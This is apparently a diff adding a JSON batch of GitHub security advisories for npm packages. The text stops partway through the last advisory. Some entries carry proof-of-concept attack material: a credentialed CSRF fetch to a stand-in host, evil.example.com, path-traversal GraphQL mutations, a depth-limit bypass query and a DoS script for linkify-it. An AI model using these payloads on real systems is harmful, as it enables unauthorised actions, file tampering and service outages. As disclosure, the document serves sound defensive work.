@@ -1,0 +1,5687 @@
+[
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2234-fmw7-43wr",
+    "published": "2024-10-15T17:43:50Z",
+    "modified": "2026-09-10T03:50:19.035733420Z",
+    "aliases": [
+      "CVE-2024-48913"
+    ],
+    "summary": "Hono allows bypass of CSRF Middleware by a request without Content-Type header.",
+    "details": "### Summary\nBypass CSRF Middleware by a request without Content-Type herader.\n\n### Details\nAlthough the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.\n\nhttps://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89\n\n### PoC\n```server.js\n// server.js\nimport { Hono } from 'hono'\nimport { csrf }from 'hono/csrf'\nconst app = new Hono()\napp.use(csrf())\napp.get('/', (c) => {\n  return c.html('Hello Hono!')\n})\napp.post('/', async (c) => {\n  console.log(\"executed\")\n  return c.text( await c.req.text())\n})\nDeno.serve(app.fetch)\n```\n\n```poc.html\n<!-- PoC.html -->\n<script>\nasync function myclick() {\n    await fetch(\"http://evil.example.com\", {\n    method: \"POST\",\n    credentials: \"include\",\n    body:new Blob([`test`],{}),\n    });\n}\n</script>\n<input type=\"button\" onclick=\"myclick()\" value=\"run\" />\n```\n\nSimilarly, the fetch API does not add a Content-Type header for requests that do not include a Body.\n```PoC2.js\nawait fetch(\"http://localhost:8000\", { method: \"POST\", credentials: \"include\"});\n```\n\n### Impact\nBypass csrf protection implemented with hono csrf middleware.\n",
+    "affected": [
+      {
+        "package": {
+          "name": "hono",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/hono"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "4.6.5"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-2234-fmw7-43wr/GHSA-2234-fmw7-43wr.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48913"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/honojs/hono"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-352"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2024-10-15T17:43:50Z",
+      "nvd_published_at": "2024-10-15T16:15:05Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2238-xc5r-v9hj",
+    "published": "2026-03-12T17:50:28Z",
+    "modified": "2026-03-14T06:26:21.083736Z",
+    "aliases": [
+      "CVE-2026-24125"
+    ],
+    "summary": "@tinacms/graphql has a Path Traversal issue",
+    "details": "### Description\n\nTinaCMS allows users to create, update, and delete content documents using relative file paths (`relativePath`, `newRelativePath`) via GraphQL mutations. Under certain conditions, these paths are combined with the collection path using `path.join()` without validating that the resolved path remains within the collection root directory.\n\nBecause `path.join()` does not prevent directory traversal, paths containing `../` sequences can escape the intended directory boundary.\n\n### Attack Vectors\n\n1. **File Creation**: Create files outside the collection directory\n   ```graphql\n   createDocument(\n     collection: \"post\"\n     relativePath: \"../../config/malicious.md\"\n     params: { post: { title: \"malicious\" } }\n   )\n   ```\n\n2. **File Move/Rename**: Move existing files outside the collection\n   ```graphql\n   updateDocument(\n     collection: \"post\"\n     relativePath: \"existing.md\"\n     params: { relativePath: \"../../stolen.md\" }\n   )\n   ```\n\n3. **File Deletion**: Delete files outside the collection\n   ```graphql\n   deleteDocument(\n     collection: \"post\"\n     relativePath: \"../../important-config.md\"\n   )\n   ```\n\n4. **Folder Creation**: Create folders outside the collection\n   ```graphql\n   createFolder(\n     collection: \"post\"\n     relativePath: \"../../malicious-folder\"\n   )\n   ```\n\n## Impact\n\nAn authenticated user with document mutation permissions can:\n\n- **Create content files** outside collection boundaries (subject to schema validation)\n- **Move or rename files** outside collection boundaries\n- **Delete content files** outside collection boundaries\n- **Read file contents** via document retrieval mutations\n\n## Mitigating Factors\n\nSeveral constraints limit the practical impact of this vulnerability:\n\n1. **Schema Validation**: Created/updated content must conform to the collection's GraphQL schema. Attackers cannot write arbitrary file content—the `params` argument is validated against the generated mutation types (e.g., `PostMutation`).\n\n2. **Authentication Required**: Exploitation requires authenticated access with CMS editor permissions. Anonymous users cannot access GraphQL mutations.\n\n3. **Git Tracking**: In typical deployments, all file operations are tracked in git (either via GitHub API for Tina Cloud/self-hosted with GitProvider, or local filesystem changes). Malicious changes are visible in version control and can be reverted.\n\n### What This Vulnerability Does NOT Allow\n\n- Writing arbitrary file content (content is schema-validated)\n- Silent/untracked file modifications (changes appear in git)\n- Unauthenticated access\n\n## Proof of Concept\n\nSee `packages/@tinacms/graphql/tests/path-traversal-security/index.test.ts` for automated tests demonstrating the vulnerability.\n\nManual reproduction:\n```bash\nnode -e \"\nconst path = require('path');\n\nconst collectionPath = 'content/posts';\nconst maliciousRelativePath = '../../OUTSIDE/poc.md';\n\nconst realPath = path.join(collectionPath, maliciousRelativePath);\nconsole.log('Resolved path:', realPath);\n// Output: OUTSIDE/poc.md (escaped content/posts)\n\"\n```",
+    "affected": [
+      {
+        "package": {
+          "name": "@tinacms/graphql",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40tinacms/graphql"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.1.2"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.1.1",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-2238-xc5r-v9hj/GHSA-2238-xc5r-v9hj.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/tinacms/tinacms/security/advisories/GHSA-2238-xc5r-v9hj"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24125"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/tinacms/tinacms"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-22"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-03-12T17:50:28Z",
+      "nvd_published_at": "2026-03-12T17:16:39Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-223g-f5mq-gw33",
+    "published": "2026-05-13T01:39:04Z",
+    "modified": "2026-06-09T00:00:20.848304042Z",
+    "aliases": [
+      "CVE-2026-44720"
+    ],
+    "summary": "OpenLearnX: Critical Authentication Bypass via JWT Signature Verification Disabled Leading to Account Takeover",
+    "details": "### Overview\n\nA critical authentication vulnerability was identified in OpenLearnX that could allow unauthorized access to user accounts under specific conditions. The issue has been fixed.\n\n**Advisory**:  https://github.com/th30d4y/OpenLearnX/security/advisories/GHSA-223g-f5mq-gw33",
+    "affected": [
+      {
+        "package": {
+          "name": "openlearnx",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/openlearnx"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.0.4"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-223g-f5mq-gw33/GHSA-223g-f5mq-gw33.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/th30d4y/OpenLearnX/security/advisories/GHSA-223g-f5mq-gw33"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44720"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/th30d4y/OpenLearnX"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/th30d4y/OpenLearnX/releases/tag/v2.0.4"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-287",
+        "CWE-347"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-05-13T01:39:04Z",
+      "nvd_published_at": "2026-05-27T22:16:36Z",
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-223j-4rm8-mrmf",
+    "published": "2025-04-02T22:35:37Z",
+    "modified": "2025-10-13T15:35:50Z",
+    "aliases": [
+      "CVE-2025-30218"
+    ],
+    "summary": "Next.js may leak x-middleware-subrequest-id to external hosts",
+    "details": "## Summary\nIn the process of remediating [CVE-2025-29927](https://github.com/advisories/GHSA-f82v-jwr5-mffw), we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.\n\nLearn more [here](https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O).\n\n## Credit\n\nThank you to Jinseo Kim [kjsman](https://hackerone.com/kjsman?type=user) and [RyotaK](https://hackerone.com/ryotak?type=user) (GMO Flatt Security Inc.) with [takumi-san.ai](https://takumi-san.ai) for the responsible disclosure. These researchers were awarded as part of our bug bounty program.",
+    "affected": [
+      {
+        "package": {
+          "name": "next",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/next"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "12.3.5"
+              },
+              {
+                "fixed": "12.3.6"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "12.3.5"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-223j-4rm8-mrmf/GHSA-223j-4rm8-mrmf.json"
+        }
+      },
+      {
+        "package": {
+          "name": "next",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/next"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "13.5.9"
+              },
+              {
+                "fixed": "13.5.10"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "13.5.9"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-223j-4rm8-mrmf/GHSA-223j-4rm8-mrmf.json"
+        }
+      },
+      {
+        "package": {
+          "name": "next",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/next"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "14.2.25"
+              },
+              {
+                "fixed": "14.2.26"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "14.2.25"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-223j-4rm8-mrmf/GHSA-223j-4rm8-mrmf.json"
+        }
+      },
+      {
+        "package": {
+          "name": "next",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/next"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "15.2.3"
+              },
+              {
+                "fixed": "15.2.4"
+              }
+            ]
+          }
+        ],
+        "versions": [
+          "15.2.3"
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-223j-4rm8-mrmf/GHSA-223j-4rm8-mrmf.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30218"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/vercel/next.js"
+      },
+      {
+        "type": "WEB",
+        "url": "https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-200"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-04-02T22:35:37Z",
+      "nvd_published_at": "2025-04-02T22:15:19Z",
+      "severity": "LOW"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N/E:U"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-224p-v68g-5g8f",
+    "published": "2025-08-26T18:45:55Z",
+    "modified": "2025-08-26T18:45:55Z",
+    "summary": "GraphQL Armor Max-Depth Plugin Bypass via fragment caching",
+    "details": "### Summary\nA query depth restriction using the max-depth can be bypassed if `ignoreIntrospection` is enabled (which is the default configuration) by naming your query/fragment `__schema`.\n\n### Details\nIn the `countDepth` function, we have the following code that calculates the depth of a used fragment:\n\n```typescript\n    } else if (node.kind == Kind.FRAGMENT_SPREAD) {\n      if (this.visitedFragments.has(node.name.value)) {\n        return this.visitedFragments.get(node.name.value) ?? 0;\n      } else {\n        this.visitedFragments.set(node.name.value, -1);\n      }\n      const fragment = this.context.getFragment(node.name.value);\n      if (fragment) {\n        let fragmentDepth;\n        if (this.config.flattenFragments) {\n          fragmentDepth = this.countDepth(fragment, parentDepth);\n        } else {\n          fragmentDepth = this.countDepth(fragment, parentDepth + 1);\n        }\n        depth = Math.max(depth, fragmentDepth);\n        if (this.visitedFragments.get(node.name.value) === -1) {\n          this.visitedFragments.set(node.name.value, fragmentDepth);\n        }\n      }\n    }\n```\n\nwhich will calculate the depth of the fragment used in the current node, store the value in `this.visitedFragments` and re-use it in the future to avoid re-calculating the depth for the same fragment.\n\nThe issue arises when the same fragment is used multiple times, **at different depths**. The current caching takes into account the depth of the first occurrence, which means if the fragment is re-used later in a higher depth, this cached value is not updated.\n\nSo, for example, sending the following query with a max depth of `6`:\n\n```graphql\nquery {\n  books {\n    author {\n      ...Test\n    }\n  }\n  books {\n    author {\n      books {\n        author {\n          ...Test\n        }\n      }\n    }\n  }\n}\nfragment Test on Author {\n  books {\n    title\n  }\n}\n```\n\nThe first use of `Test` fragment does not exceed the defined limit, and this depth will be cached.\n\nIn the second use, the fragment is reused in a greater depth, but the `countDepth` function will still use the depth cached, without accounting for the increased depth.\n\n### PoC\n\nMax depth: `6`\n\n```graphql\nquery {\n  books {\n    author {\n      ...Test\n    }\n  }\n  books {\n    author {\n      books {\n        author {\n          ...Test\n        }\n      }\n    }\n  }\n}\nfragment Test on Author {\n  books {\n    title\n  }\n}\n```\n\n### Impact\n\nThis issue affects applications using the GraphQL Armor Depth Limit plugin.\n\n### Fix\n\nThis is fixed in [PR#824](https://github.com/Escape-Technologies/graphql-armor/pull/824). We now store only the additional depth contributed by the fragment and add it to the parent depth where the fragment is used (`parentDepth`).",
+    "affected": [
+      {
+        "package": {
+          "name": "@escape.tech/graphql-armor-max-depth",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40escape.tech/graphql-armor-max-depth"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "2.4.2"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "last_known_affected_version_range": "<= 2.4.1",
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-224p-v68g-5g8f/GHSA-224p-v68g-5g8f.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/Escape-Technologies/graphql-armor/security/advisories/GHSA-224p-v68g-5g8f"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/Escape-Technologies/graphql-armor/pull/824"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/Escape-Technologies/graphql-armor/commit/998986109f8c2313bd61325ddfe7f5dcd48f9232"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/Escape-Technologies/graphql-armor"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-400"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2025-08-26T18:45:55Z",
+      "nvd_published_at": null,
+      "severity": "MODERATE"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-226w-6hhj-69hp",
+    "published": "2020-09-03T19:06:52Z",
+    "modified": "2021-09-30T20:06:59Z",
+    "summary": "Malicious Package in cal_rd",
+    "details": "Version 0.1.1 of `rc_cal` contained malicious code. The code when executed in the browser would enumerate password, cvc, cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment. It's also recommended to evaluate your application to determine whether or not user data was compromised.",
+    "affected": [
+      {
+        "package": {
+          "name": "cal_rd",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/cal_rd"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0.0.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-226w-6hhj-69hp/GHSA-226w-6hhj-69hp.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://www.npmjs.com/advisories/1098"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-506"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2020-08-31T18:47:09Z",
+      "nvd_published_at": null,
+      "severity": "CRITICAL"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2275-rpf5-xv8h",
+    "published": "2023-02-01T06:30:30Z",
+    "modified": "2023-11-08T04:08:51.701195Z",
+    "aliases": [
+      "CVE-2022-25906"
+    ],
+    "summary": "is-http2 vulnerable to Improper Input Validation",
+    "details": "All versions of the package is-http2 are vulnerable to Command Injection due to missing input sanitization or other checks, and sandboxes being employed to the isH2 function.",
+    "affected": [
+      {
+        "package": {
+          "name": "is-http2",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/is-http2"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "last_affected": "1.2.0"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/02/GHSA-2275-rpf5-xv8h/GHSA-2275-rpf5-xv8h.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25906"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/stefanjudis/is-http2"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/stefanjudis/is-http2/blob/master/index.js#L23"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/stefanjudis/is-http2/blob/master/index.js%23L23"
+      },
+      {
+        "type": "WEB",
+        "url": "https://security.snyk.io/vuln/SNYK-JS-ISHTTP2-3153878"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-20",
+        "CWE-78"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2023-02-02T17:13:07Z",
+      "nvd_published_at": "2023-02-01T05:15:00Z",
+      "severity": "HIGH"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-2299-ghjr-6vjp",
+    "published": "2026-03-24T19:48:24Z",
+    "modified": "2026-03-27T22:11:19.871863Z",
+    "aliases": [
+      "BIT-parse-2026-33624",
+      "CVE-2026-33624"
+    ],
+    "summary": "Parse Server: MFA recovery code single-use bypass via concurrent requests",
+    "details": "### Impact\n\nAn attacker who obtains a user's password and a single MFA recovery code can reuse that recovery code an unlimited number of times by sending concurrent login requests. This defeats the single-use design of recovery codes. The attack requires the user's password, a valid recovery code, and the ability to send concurrent requests within milliseconds.\n\n### Patches\n\nThe login handler now uses optimistic locking when updating auth data that contains consumed single-use tokens. If a concurrent request has already modified the recovery array, the update fails and the login is rejected.\n\n### Workarounds\n\nThere are no known workarounds.",
+    "affected": [
+      {
+        "package": {
+          "name": "parse-server",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/parse-server"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "9.0.0"
+              },
+              {
+                "fixed": "9.6.0-alpha.54"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-2299-ghjr-6vjp/GHSA-2299-ghjr-6vjp.json"
+        }
+      },
+      {
+        "package": {
+          "name": "parse-server",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/parse-server"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "0"
+              },
+              {
+                "fixed": "8.6.60"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-2299-ghjr-6vjp/GHSA-2299-ghjr-6vjp.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp"
+      },
+      {
+        "type": "ADVISORY",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33624"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/parse-community/parse-server/pull/10275"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/parse-community/parse-server/pull/10276"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/parse-community/parse-server/commit/5e70094250a36bfcc14ecd49592be2b94fba66ff"
+      },
+      {
+        "type": "WEB",
+        "url": "https://github.com/parse-community/parse-server/commit/fc3da35a81d5083b453e8967cabcc880f1a3bd0c"
+      },
+      {
+        "type": "PACKAGE",
+        "url": "https://github.com/parse-community/parse-server"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-367"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2026-03-24T19:48:24Z",
+      "nvd_published_at": "2026-03-24T19:16:55Z",
+      "severity": "LOW"
+    },
+    "severity": [
+      {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:H/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+      }
+    ]
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-22h7-7wwg-qmgg",
+    "published": "2020-09-04T17:56:39Z",
+    "modified": "2020-08-31T19:00:24Z",
+    "summary": "Prototype Pollution in @hapi/hoek",
+    "details": "Versions of `@hapi/hoek` prior to 8.5.1 and 9.0.3 are vulnerable to Prototype Pollution. The `clone` function fails to prevent the modification of the Object prototype when passed specially-crafted input. Attackers may use this to change existing properties that exist in all objects, which may lead to Denial of Service or Remote Code Execution in specific circumstances.  \nThis issue __does not__ affect hapi applications since the framework protects against such malicious inputs. Applications that use `@hapi/hoek` outside of the hapi ecosystem may be vulnerable.\n\n\n## Recommendation\n\nUpdate to version 8.5.1, 9.0.3 or later.",
+    "affected": [
+      {
+        "package": {
+          "name": "@hapi/hoek",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40hapi/hoek"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "8.3.2"
+              },
+              {
+                "fixed": "8.5.1"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-22h7-7wwg-qmgg/GHSA-22h7-7wwg-qmgg.json"
+        }
+      },
+      {
+        "package": {
+          "name": "@hapi/hoek",
+          "ecosystem": "npm",
+          "purl": "pkg:npm/%40hapi/hoek"
+        },
+        "ranges": [
+          {
+            "type": "SEMVER",
+            "events": [
+              {
+                "introduced": "9.0.0"
+              },
+              {
+                "fixed": "9.0.3"
+              }
+            ]
+          }
+        ],
+        "database_specific": {
+          "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-22h7-7wwg-qmgg/GHSA-22h7-7wwg-qmgg.json"
+        }
+      }
+    ],
+    "references": [
+      {
+        "type": "WEB",
+        "url": "https://www.npmjs.com/advisories/1468"
+      }
+    ],
+    "database_specific": {
+      "cwe_ids": [
+        "CWE-1321"
+      ],
+      "github_reviewed": true,
+      "github_reviewed_at": "2020-08-31T19:00:24Z",
+      "nvd_published_at": null,
+      "severity": "LOW"
+    }
+  },
+  {
+    "schema_version": "1.9.0",
+    "id": "GHSA-22p9-wv53-3rq4",
+    "published": "2026-06-26T20:47:58Z",
+    "modified": "2026-09-10T03:51:07.300156595Z",
+    "aliases": [
+      "CVE-2026-48801"
+    ],
+    "summary": "LinkifyIt#match scan loop has quadratic algorithmic complexity",
+    "details": "## Summary\n\n`LinkifyIt.prototype.match` — the package's primary public API — has **O(N²) algorithmic complexity** for inputs containing many fuzzy links or emails. This is not a regex backtrack bug; it's a structural issue in the JS-level scan loop that re-slices the input and re-runs unanchored regex searches on progressively shorter tails, N times.\n\n64 KB of `\"a@b.com\\n\"` repeated burns ~2.5 s of single-threaded CPU; 128 KB takes ~10 s. Doubling the input quadruples the time — textbook O(N²).\n\nThe same cost passes through `markdown-it` (`linkify:true`) unmodified. Any service that synchronously renders untrusted Markdown with linkify enabled on a request hot-path (forums, comments, chat, wikis, AI chat UIs) inherits a worker-process DoS triggerable by a tens-of-KB request body.\n\n## Affected component\n\n- HEAD audited: `8e887d5bace3f5b09b1d1f70492fa0364ef1793d` (v5.0.0)\n- Vulnerable function: `LinkifyIt.prototype.match` — `index.mjs:528-554`\n- Re-scan call sites inside `test()`: `index.mjs:444` (fuzzy host search), `:448` (fuzzy link match), `:467` (fuzzy email match)\n- Transitive consumer: `markdown-it` (~21.6M weekly npm DLs) calls `linkify.match()` at `lib/rules_core/linkify.mjs:57` when `linkify:true`\n- **All versions affected** — the vulnerable loop exists since the initial commit (2014) through v5.0.0\n\n## Vulnerability details\n\n### The O(N²) outer loop\n\n`index.mjs:528-554`:\n\n```js\nLinkifyIt.prototype.match = function match (text) {\n  const result = []\n  let shift = 0\n  let tail = shift ? text.slice(shift) : text\n\n  while (this.test(tail)) {\n    result.push(createMatch(this, shift))\n    tail = tail.slice(this.__last_index__)   // <-- re-allocates remaining tail each iteration\n    shift += this.__last_index__\n  }\n\n  if (result.length) return result\n  return null\n}\n```\n\nThe loop iterates O(N) times (once per match). Each iteration:\n1. `tail.slice()` re-allocates a string of length `|text| - shift` — O(N) per iteration\n2. `this.test(tail)` runs three unanchored regex searches over the full new `tail`:\n\n```js\n// index.mjs:444 — full-tail search\ntld_pos = text.search(this.re.host_fuzzy_test)\n// index.mjs:448 — full-tail match\nml = text.match(this.re.link_fuzzy)\n// index.mjs:467 — full-tail match\nme = text.match(this.re.email_fuzzy)\n```\n\nTotal cost: `Σ(N - i*c) for i=0..N = O(N²)`.\n\n### Contrast with the linear schema branch\n\nThe schema-prefixed scan in the same `test()` function does it correctly at `index.mjs:428-440`:\n\n```js\nre = this.re.schema_search\nre.lastIndex = 0\nwhile ((m = re.exec(text)) !== null) { ... }\n```\n\nThat branch uses a `g`-flag RegExp and advances `lastIndex` — linear. The fuzzy branches don't follow this pattern.\n\n## Proof of concept\n\n```bash\nmkdir /tmp/linkifyit-redos && cd /tmp/linkifyit-redos\nnpm install linkify-it@5.0.0\n\ncat > poc.mjs <<'EOF'\nimport LinkifyIt from 'linkify-it'\nconst l = new LinkifyIt()\nfor (const n of [1000, 2000, 4000, 8000, 16000]) {\n  const evil = 'a@b.com\\n'.repeat(n)\n  const t0 = process.hrtime.bigint()\n  l.match(evil)\n  const ms = Number(process.hrtime.bigint() - t0) / 1e6\n  console.log(`n=${n} bytes=${evil.length} took ${ms.toFixed(0)} ms`)\n}\nEOF\nnode poc.mjs\n```\n\n### Measured output (Node v25.5.0, Apple Silicon)\n\n```\nn=1000  bytes=8000    took 44 ms\nn=2000  bytes=16000   took 159 ms\nn=4000  bytes=32000   took 628 ms\nn=8000  bytes=64000   took 2506 ms\nn=16000 bytes=128000  took 9948 ms\n```\n\nDoubling N → ~4× wall-clock, consistent with O(N²).\n\n### markdown-it transitive (independently 